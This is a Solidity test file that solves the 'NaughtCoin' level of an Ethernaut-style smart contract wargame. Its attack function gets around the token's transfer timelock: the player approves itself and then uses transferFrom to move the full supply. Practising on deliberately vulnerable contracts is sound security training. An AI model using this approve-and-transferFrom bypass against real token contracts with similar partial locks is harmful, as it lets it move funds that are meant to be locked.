// SPDX-License-Identifier: Unlicense
pragma solidity =0.8.23;

import {Tests} from "@core/Tests.sol";
import {NaughtCoinFactory, NaughtCoin} from "../levels/15_NaughtCoin/NaughtCoinFactory.sol";

contract TestNaughtCoin is Tests {
    NaughtCoin private level;

    /* =============================== SETUP&ATTACK =============================== */

    constructor() {
        levelFactory = new NaughtCoinFactory();
    }

    function setupLevel() internal override {
        levelAddress = payable(this.createLevelInstance());
        level = NaughtCoin(levelAddress);
    }

    function attack() internal override {
        vm.startPrank(PLAYER);

        uint256 amount = level.INITIAL_SUPPLY();
        // We approve ourselves, in order to use the {transferFrom}
        level.approve(PLAYER, amount);
        level.transferFrom(PLAYER, RANDOM, amount);

        vm.stopPrank();
    }

    /* =============================== TEST LEVEL =============================== */

    function testLevel() external {
        runLevel();
    }
}
